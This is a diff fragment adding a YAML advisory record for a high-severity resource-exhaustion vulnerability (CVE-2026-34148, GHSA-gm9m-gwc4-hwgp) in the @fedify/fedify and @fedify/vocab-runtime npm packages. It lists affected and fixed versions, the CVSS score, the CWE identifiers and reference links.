+      - pkg:npm/%40fedify/fedify@1.9.0-pr.355.1356
+      - pkg:npm/%40fedify/fedify@1.9.0-pr.364.1358
+      - pkg:npm/%40fedify/fedify@1.9.0-pr.364.1359
+      - pkg:npm/%40fedify/fedify@1.9.0-pr.364.1360
+      - pkg:npm/%40fedify/fedify@1.9.0-pr.364.1361
+      - pkg:npm/%40fedify/fedify@1.9.0-pr.364.1364
+      - pkg:npm/%40fedify/fedify@1.9.0-pr.364.1367
+      - pkg:npm/%40fedify/fedify@1.9.0-pr.365.1363
+      - pkg:npm/%40fedify/fedify@1.9.0-pr.365.1365
+      - pkg:npm/%40fedify/fedify@1.9.0-pr.368.1370
+      - pkg:npm/%40fedify/fedify@1.9.0-pr.368.1371
+      - pkg:npm/%40fedify/fedify@1.9.0-pr.368.1414
+      - pkg:npm/%40fedify/fedify@1.9.0-pr.370.1389
+      - pkg:npm/%40fedify/fedify@1.9.0-pr.372.1383
+      - pkg:npm/%40fedify/fedify@1.9.0-pr.372.1384
+      - pkg:npm/%40fedify/fedify@1.9.0-pr.378.1394
+      - pkg:npm/%40fedify/fedify@1.9.0-pr.378.1407
+      - pkg:npm/%40fedify/fedify@1.9.0-pr.381.1398
+      - pkg:npm/%40fedify/fedify@1.9.0-pr.383.1403
+      - pkg:npm/%40fedify/fedify@1.9.0-pr.385.1405
+      - pkg:npm/%40fedify/fedify@1.9.0-pr.387.1422
+      - pkg:npm/%40fedify/fedify@1.9.0-pr.387.1423
+      - pkg:npm/%40fedify/fedify@1.9.0-pr.388.1454
+      - pkg:npm/%40fedify/fedify@1.9.0-pr.388.1456
+      - pkg:npm/%40fedify/fedify@1.9.0-pr.388.1457
+      - pkg:npm/%40fedify/fedify@1.9.0-pr.388.1458
+      - pkg:npm/%40fedify/fedify@1.9.0-pr.388.1459
+      - pkg:npm/%40fedify/fedify@1.9.0-pr.388.1460
+      - pkg:npm/%40fedify/fedify@1.9.0-pr.389.1473
+      - pkg:npm/%40fedify/fedify@1.9.0-pr.389.1491
+      - pkg:npm/%40fedify/fedify@1.9.0-pr.395.1481
+      - pkg:npm/%40fedify/fedify@1.9.0-pr.403.1503
+      - pkg:npm/%40fedify/fedify@1.9.0-pr.403.1507
+      - pkg:npm/%40fedify/fedify@1.9.0-pr.403.1509
+      - pkg:npm/%40fedify/fedify@1.9.0-pr.404.1510
+      - pkg:npm/%40fedify/fedify@1.9.0-pr.404.1515
+      - pkg:npm/%40fedify/fedify@1.9.0-pr.405.1518
+      - pkg:npm/%40fedify/fedify@1.9.0-pr.406.1520
+      - pkg:npm/%40fedify/fedify@1.9.0-pr.406.1521
+      - pkg:npm/%40fedify/fedify@1.9.0-pr.407.1525
+      - pkg:npm/%40fedify/fedify@1.9.0-pr.407.1527
+      - pkg:npm/%40fedify/fedify@1.9.0-pr.407.1528
+      - pkg:npm/%40fedify/fedify@1.9.0-pr.407.1534
+      - pkg:npm/%40fedify/fedify@1.9.0-pr.407.1541
+      - pkg:npm/%40fedify/fedify@1.9.0-pr.407.1544
+      - pkg:npm/%40fedify/fedify@1.9.0-pr.421.1746
+      - pkg:npm/%40fedify/fedify@1.9.0-pr.421.1747
+      - pkg:npm/%40fedify/fedify@1.9.0-pr.422.1611
+      - pkg:npm/%40fedify/fedify@1.9.0-pr.428.1586
+      - pkg:npm/%40fedify/fedify@1.9.0-pr.428.1587
+      - pkg:npm/%40fedify/fedify@1.9.0-pr.428.1588
+      - pkg:npm/%40fedify/fedify@1.9.0-pr.431.1597
+      - pkg:npm/%40fedify/fedify@1.9.0-pr.431.1610
+      - pkg:npm/%40fedify/fedify@1.9.0-pr.439.1643
+      - pkg:npm/%40fedify/fedify@1.9.0-pr.442.1663
+      - pkg:npm/%40fedify/fedify@1.9.0-pr.443.1681
+      - pkg:npm/%40fedify/fedify@1.9.0-pr.443.1682
+      - pkg:npm/%40fedify/fedify@1.9.0-pr.455.1742
+      - pkg:npm/%40fedify/fedify@1.9.0
+      - pkg:npm/%40fedify/fedify@1.9.1-dev.1868
+      - pkg:npm/%40fedify/fedify@1.9.1-dev.1869
+      - pkg:npm/%40fedify/fedify@1.9.1
+      - pkg:npm/%40fedify/fedify@1.9.2-dev.1890
+      - pkg:npm/%40fedify/fedify@1.9.2
+      - pkg:npm/%40fedify/fedify@1.9.3
+      - pkg:npm/%40fedify/fedify@1.9.4
+      - pkg:npm/%40fedify/fedify@1.9.5
+      - pkg:npm/%40fedify/fedify@1.9.6-dev.2118
+    fixed_packages:
+      - pkg:npm/%40fedify/fedify@1.9.6
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:npm/%40fedify/vocab-runtime
+    affected_versions: vers:npm/<2.0.8
+    fixed_versions: vers:npm/2.0.8
+    affected_packages:
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-dev.12
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-dev.85
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-dev.100
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-dev.109
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-dev.150
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-dev.158
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-dev.159
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-dev.160
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-dev.161
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-dev.166
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-dev.167
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-dev.170
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-dev.196
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-dev.206
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-dev.211
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-dev.215
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-dev.221
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-dev.226
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-dev.228
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-dev.236
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-dev.237
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-dev.241
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-dev.279
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-dev.323
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-dev.335
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-dev.372
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-dev.377
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-dev.379
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-dev.380
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-dev.382
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-dev.383
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-dev.384
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-dev.385
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-dev.387
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-dev.389
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-dev.393
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-dev.395
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-dev.396
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-dev.397
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-dev.1757
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-dev.1761
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-dev.1795
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-dev.1799
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-dev.1801
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-dev.1807
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-dev.1872
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-dev.1875
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-dev.1908
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-pr.412.1794
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-pr.451.1730
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-pr.451.1731
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-pr.451.1735
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-pr.457.1754
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-pr.457.1756
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-pr.458.1785
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-pr.458.1788
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-pr.458.1791
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-pr.458.1796
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-pr.467.1876
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-pr.467.1877
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-pr.469.1873
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-pr.471.1909
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-pr.471.1920
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-pr.471.1921
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-pr.471.1923
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-pr.471.1924
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-pr.474.1879
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-pr.478.1911
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-pr.478.1916
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-pr.478.1917
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-pr.478.1918
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-pr.479.1900
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-pr.479.1902
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-pr.479.1903
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-pr.479.1913
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-pr.479.1919
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-pr.479.1922
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-pr.490.2
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-pr.559.4
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-pr.559.5
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0-pr.559.6
+      - pkg:npm/%40fedify/vocab-runtime@2.0.0
+      - pkg:npm/%40fedify/vocab-runtime@2.0.1-dev.400
+      - pkg:npm/%40fedify/vocab-runtime@2.0.1-dev.401
+      - pkg:npm/%40fedify/vocab-runtime@2.0.1
+      - pkg:npm/%40fedify/vocab-runtime@2.0.2-dev.407
+      - pkg:npm/%40fedify/vocab-runtime@2.0.2
+      - pkg:npm/%40fedify/vocab-runtime@2.0.3
+      - pkg:npm/%40fedify/vocab-runtime@2.0.4-dev.521
+      - pkg:npm/%40fedify/vocab-runtime@2.0.4
+      - pkg:npm/%40fedify/vocab-runtime@2.0.5
+      - pkg:npm/%40fedify/vocab-runtime@2.0.6-dev.548
+      - pkg:npm/%40fedify/vocab-runtime@2.0.6-dev.559
+      - pkg:npm/%40fedify/vocab-runtime@2.0.6-dev.561
+      - pkg:npm/%40fedify/vocab-runtime@2.0.6-dev.564
+      - pkg:npm/%40fedify/vocab-runtime@2.0.6-pr.633.9
+      - pkg:npm/%40fedify/vocab-runtime@2.0.6
+      - pkg:npm/%40fedify/vocab-runtime@2.0.7-dev.573
+      - pkg:npm/%40fedify/vocab-runtime@2.0.7-dev.586
+      - pkg:npm/%40fedify/vocab-runtime@2.0.7-pr.639.14
+      - pkg:npm/%40fedify/vocab-runtime@2.0.7
+    fixed_packages:
+      - pkg:npm/%40fedify/vocab-runtime@2.0.8
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:npm/%40fedify/vocab-runtime
+    affected_versions: vers:npm/2.1.0
+    fixed_versions: vers:npm/2.1.1
+    affected_packages:
+      - pkg:npm/%40fedify/vocab-runtime@2.1.0
+    fixed_packages:
+      - pkg:npm/%40fedify/vocab-runtime@2.1.1
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:npm/%40fedify/fedify
+    affected_versions: vers:npm/>=1.10.0|<1.10.5
+    fixed_versions: vers:npm/1.10.5
+    affected_packages:
+      - pkg:npm/%40fedify/fedify@1.10.0
+      - pkg:npm/%40fedify/fedify@1.10.1
+      - pkg:npm/%40fedify/fedify@1.10.2
+      - pkg:npm/%40fedify/fedify@1.10.3
+      - pkg:npm/%40fedify/fedify@1.10.4
+    fixed_packages:
+      - pkg:npm/%40fedify/fedify@1.10.5
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:npm/%40fedify/fedify
+    affected_versions: vers:npm/>=2.0.0|<2.0.8
+    fixed_versions: vers:npm/2.0.8
+    affected_packages:
+      - pkg:npm/%40fedify/fedify@2.0.0
+      - pkg:npm/%40fedify/fedify@2.0.1-dev.400
+      - pkg:npm/%40fedify/fedify@2.0.1-dev.401
+      - pkg:npm/%40fedify/fedify@2.0.1
+      - pkg:npm/%40fedify/fedify@2.0.2-dev.407
+      - pkg:npm/%40fedify/fedify@2.0.2-dev.415
+      - pkg:npm/%40fedify/fedify@2.0.2
+      - pkg:npm/%40fedify/fedify@2.0.3
+      - pkg:npm/%40fedify/fedify@2.0.4-dev.521
+      - pkg:npm/%40fedify/fedify@2.0.4
+      - pkg:npm/%40fedify/fedify@2.0.5
+      - pkg:npm/%40fedify/fedify@2.0.6-dev.548
+      - pkg:npm/%40fedify/fedify@2.0.6-dev.559
+      - pkg:npm/%40fedify/fedify@2.0.6-dev.561
+      - pkg:npm/%40fedify/fedify@2.0.6-dev.564
+      - pkg:npm/%40fedify/fedify@2.0.6-pr.633.9
+      - pkg:npm/%40fedify/fedify@2.0.6
+      - pkg:npm/%40fedify/fedify@2.0.7-dev.573
+      - pkg:npm/%40fedify/fedify@2.0.7-dev.586
+      - pkg:npm/%40fedify/fedify@2.0.7-pr.639.14
+      - pkg:npm/%40fedify/fedify@2.0.7
+    fixed_packages:
+      - pkg:npm/%40fedify/fedify@2.0.8
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:npm/%40fedify/fedify
+    affected_versions: vers:npm/2.1.0
+    fixed_versions: vers:npm/2.1.1
+    affected_packages:
+      - pkg:npm/%40fedify/fedify@2.1.0
+    fixed_packages:
+      - pkg:npm/%40fedify/fedify@2.1.1
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '7.5'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-gm9m-gwc4-hwgp/GHSA-gm9m-gwc4-hwgp.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-400
+  - CWE-770
+references:
+  - url: https://github.com/fedify-dev/fedify
+    reference_type:
+    reference_id:
+  - url: https://github.com/fedify-dev/fedify/releases/tag/1.10.5
+    reference_type:
+    reference_id:
+  - url: https://github.com/fedify-dev/fedify/releases/tag/1.9.6
+    reference_type:
+    reference_id:
+  - url: https://github.com/fedify-dev/fedify/releases/tag/2.0.8
+    reference_type:
+    reference_id:
+  - url: https://github.com/fedify-dev/fedify/releases/tag/2.1.1
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-34148
+    reference_type:
+    reference_id: CVE-2026-34148
+  - url: https://github.com/fedify-dev/fedify/security/advisories/GHSA-gm9m-gwc4-hwgp
+    reference_type:
+    reference_id: GHSA-gm9m-gwc4-hwgp
+exploits: []
